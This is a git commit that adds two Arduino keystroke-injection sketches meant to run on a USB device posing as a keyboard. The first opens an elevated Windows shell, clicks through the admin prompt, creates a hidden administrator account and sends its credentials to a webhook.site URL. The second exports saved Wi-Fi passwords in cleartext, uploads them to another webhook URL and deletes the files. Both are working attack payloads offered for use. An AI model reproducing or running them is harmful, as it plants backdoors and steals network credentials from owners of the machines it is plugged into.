6f511ac0ca89f7aa658d2d3db3349234aff774c4
MinDFramE <mindframe@gmail.com>
2021-03-30 21:11:14 +0200

    BackDoor

---
+++ BackDoor/Backdoor/Backdoor.ino
@@ -0,0 +1,94 @@
+#include <Keyboard.h>
+
+//This script will create an admin user
+
+void setup() {
+  
+  String letters[36] = {"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l",
+                        "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x",
+                        "y", "z", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0"};
+  
+  Keyboard.begin();
+  
+  //This block is made just to launch "win+r" sometimes, 
+  //the system ignores the first try, so I just do it twice
+  Keyboard.write(0xB0);
+  Keyboard.releaseAll();
+  delay(300);
+  Keyboard.write(KEY_ESC);
+  Keyboard.press(KEY_RIGHT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+  delay(300);
+  Keyboard.write(KEY_ESC);
+  Keyboard.press(KEY_RIGHT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+  delay(300);
+
+  //Launch small cmd
+  //Keyboard.println("cmd /k mode con: cols=50 lines=1");
+  Keyboard.println("cmd");
+  delay(300);
+  
+  //If we want to run cmd as admin, we need to execute cmd with ctrl+shift+enter
+   
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press(KEY_LEFT_SHIFT);
+  Keyboard.press(0xB0);
+  Keyboard.releaseAll();
+  delay(1000);
+    
+  //The confirmation screen will pop up, so wee will press left and enter
+   
+  Keyboard.write(KEY_LEFT_ARROW);
+  delay(300);
+  Keyboard.write(0xB0);
+  delay(300);
+
+
+  //We are going to create now a random userName and Pass
+
+  String userName = "";
+  String pass = "";
+  for(int i = 0; i < 10; i++)
+  {
+   userName += letters[random(0, 36)];
+   pass += letters[random(0,36)];
+  }
+
+  
+  //Open Powershell:
+  Keyboard.println("powershell");
+  Keyboard.write(0xB0);
+  delay(300);
+
+  //Lets create an user:
+  Keyboard.println("net user /add "+ userName +" "+ pass);//TODO random generate user and pass
+  Keyboard.write(0xB0);
+  delay(1000);
+
+  //We need to extract the administrators group name and store it:
+  Keyboard.println("$Group = Get-WmiObject -Query \"Select * From Win32_Group Where LocalAccount = TRUE And SID = 'S-1-5-32-544'\"");
+  Keyboard.write(0xB0);
+  delay(100);
+  Keyboard.println("$gName = $Group.Name");
+  Keyboard.write(0xB0);
+  delay(300);
+  
+  //Add him to admin group
+  Keyboard.println("net localgroup $gName "+ userName +" /add");
+  Keyboard.write(0xB0);
+  delay(300);
+
+  //Now we will send the credentials to our webhook
+  Keyboard.println("curl https://webhook.site/3d514486-23ee-413f-974f-5f6ad43c1e8d?user="+ userName +"\"&\"Pass="+ pass);
+  Keyboard.write(0xB0);
+
+  //Close the window
+  //Keyboard.write("exit");
+}
+
+void loop() {
+
+}
---
+++ WiFi/WiFi.ino
@@ -0,0 +1,46 @@
+#include <Keyboard.h>
+
+void setup() {
+
+  Keyboard.begin();
+  Keyboard.write(0xB0);
+  Keyboard.releaseAll();
+  delay(300);
+  Keyboard.write(KEY_ESC);
+  Keyboard.press(KEY_RIGHT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+  delay(300);
+  Keyboard.write(KEY_ESC);
+  Keyboard.press(KEY_RIGHT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+  delay(300);
+  //super smol cmd : )
+  Keyboard.println("cmd /k mode con: cols=50 lines=1");
+  //Keyboard.println("cmd");
+  Keyboard.write(0xB0);
+  delay(300);
+  Keyboard.println("cd %temp%");
+  Keyboard.write(0xB0);
+  delay(300);
+  Keyboard.println("netsh wlan export profile key=clear");
+  Keyboard.write(0xB0);
+  delay(500);
+  Keyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-FiPASS.txt");
+  Keyboard.write(0xB0);
+  delay(300);
+  Keyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/6d5b5524-cfb6-44b0-8fe8-5de50bd39e6b -Method POST -InFile Wi-FiPASS.txt -ContentType: text/plain");
+  Keyboard.write(0xB0);
+  delay(3000);
+  Keyboard.println("del WI-Fi*");
+  Keyboard.write(0xB0);
+  delay(300);
+  Keyboard.println("exit");
+  Keyboard.write(0xB0);
+  Keyboard.end();
+}
+
+void loop() {
+
+}
